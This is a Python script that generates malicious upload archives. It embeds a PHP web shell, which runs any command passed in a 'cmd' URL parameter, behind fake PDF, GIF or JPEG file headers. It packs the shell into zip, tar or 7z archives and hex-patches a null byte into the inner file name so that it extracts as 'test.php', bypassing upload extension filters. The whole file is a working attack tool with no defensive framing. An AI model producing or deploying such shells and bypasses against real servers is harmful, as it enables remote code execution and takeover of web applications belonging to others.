import sys
import zipfile
import tarfile
import os
import subprocess

# Use filename with two dots at the end
php_file_name = 'test.php..'

# Payload templates keyed by format
payloads = {
    "pdf": """%PDF-1.4
<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$handle = popen($cmd, "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>
""",
    "gif": """GIF89a
<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$handle = popen($cmd, "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>
""",
    "jpeg": """\xFF\xD8\xFF
<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$handle = popen($cmd, "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>
"""
}

# Output format handlers
def create_zip(filename, payload, fake_extension):
    with zipfile.ZipFile(filename, "w") as zip_file:
        zip_file.writestr(f"{php_file_name}{fake_extension}", payload)

def create_tar(filename, payload, fake_extension):
    inner_filename = f"{php_file_name}{fake_extension}"
    with open(inner_filename, "w") as f:
        f.write(payload)
    with tarfile.open(filename, "w") as tar:
        tar.add(inner_filename)
    os.remove(inner_filename)

def create_7z(filename, payload, fake_extension):
    inner_filename = f"{php_file_name}{fake_extension}"
    with open(inner_filename, "w") as f:
        f.write(payload)
    subprocess.run(["7z", "a", filename, inner_filename], check=True)
    os.remove(inner_filename)

output_formats = {
    "zip": create_zip,
    "tar": create_tar,
    "7z": create_7z,
}

# Perform hexedit directly on the file
def hexedit(filename):
    with open(filename, "rb+") as f:
        data = f.read()

        # Encode the target string (e.g., "test.php..")
        target = php_file_name.encode()
        last_index = data.rfind(target)

        if last_index != -1:
            # Find the last '..' in the php_file_name
            double_dot_index = php_file_name.rfind("..")
            if double_dot_index != -1:
                # Calculate position of the first '.' in that '..'
                patch_index = last_index + double_dot_index
                if data[patch_index] == 0x2E and data[patch_index + 1] == 0x2E:
                    f.seek(patch_index)
                    f.write(b"\x00")
                else:
                    print("Did not find expected '..' sequence to patch.")
            else:
                print("No '..' found in the filename string.")
        else:
            print(f"Pattern '{php_file_name}' not found in the file.")

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <payload_format> <output_format>")
        sys.exit(1)

    payload_format = sys.argv[1].lower()
    output_format = sys.argv[2].lower()

    if payload_format not in payloads:
        print(f"Unsupported payload format: {payload_format}")
        sys.exit(1)

    if output_format not in output_formats:
        print(f"Unsupported output format: {output_format}")
        sys.exit(1)

    payload = payloads[payload_format]
    output_filename = f"test.{output_format}"

    # Create archive
    output_formats[output_format](output_filename, payload, payload_format)

    # Hexedit the file to patch the last occurrence of php_file_name
    hexedit(output_filename)

    print(f"Payload saved to {output_filename} with patched hex.")

if __name__ == "__main__":
    main()
